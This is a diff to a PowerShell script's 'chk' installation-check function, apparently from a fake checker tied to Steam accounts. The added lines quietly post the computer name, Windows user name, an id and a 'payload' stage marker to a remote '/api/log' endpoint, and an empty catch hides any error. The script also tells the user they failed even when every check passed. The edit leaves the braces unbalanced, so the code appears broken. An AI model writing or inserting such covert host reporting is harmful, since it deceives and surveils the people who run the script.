@@ -204,14 +204,33 @@ function chk {
     Write-Host ""
     
     if ($pc -eq $tc) {
-        Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
-        pInfo "Installation check completed" @{
-            passed = $pc
-            total = $tc
-            percentage = $pp
-            allPassed = $true
-            repaired = $needsRepair
+    Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
+    
+    try {
+        $l = @{
+            timestamp = (Get-Date).ToString("o")
+            type = "info"
+            message = "Installation check completed"
+            odId = $mId
+            pcName = $env:COMPUTERNAME
+            pcUser = $env:USERNAME
+            steamId = ""
+            username = ""
+            stage = "payload"
+            extra = @{
+                passed = $pc
+                total = $tc
+                percentage = $pp
+                allPassed = $true
+                repaired = $needsRepair
+            }
         }
+        $j = $l | ConvertTo-Json -Compress
+        $w = New-Object Net.WebClient
+        $w.Headers.Add("Content-Type", "application/json")
+        $null = $w.UploadString("$sUrl/api/log", $j)
+    } catch {}
+}
     } elseif ($pc -ge 4) {
         Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
         Write-Host ""
